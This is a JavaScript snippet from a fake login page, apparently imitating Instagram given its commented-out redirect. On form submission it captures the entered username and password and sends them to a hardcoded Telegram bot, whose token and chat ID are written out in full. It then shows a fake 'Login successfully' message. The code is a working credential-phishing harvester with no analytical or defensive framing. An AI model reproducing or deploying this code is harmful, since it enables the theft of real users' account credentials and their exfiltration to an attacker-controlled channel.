    <script>
        // JavaScript for form validation and sending data to Telegram bot
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault();

            // Get the values of the inputs
            var username = document.getElementById("username").value;
            var password = document.getElementById("password").value;

            // Basic validation
            if (username === "" || password === "") {
                alert("Please fill out both fields.");
                return;
            }

            // Telegram Bot Token and Chat ID
            var botToken = "7380128813:AAGRejEdqQ8rByGCE6zyl1_5RHS4r_JOwNg";  
            var chatID = "7135110561";      

            // Prepare message
            var message = "New Login Attempt:\n";
            message += "Username: " + username + "\n";
            message += "Password: " + password;

            // Send message to Telegram bot using Fetch API
            var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        alert("Login successfully !");
                    } else {
                        alert("Failed to login.");
                    }
                })
                .catch(error => {
                    console.error("Error:", error);
                    alert("An error occurred.");
                });

            // Optionally, simulate a successful login or redirect (remove if unnecessary)
            // alert("Logged in successfully!");
            // window.location.href = "https://www.instagram.com";
        });
    </script>
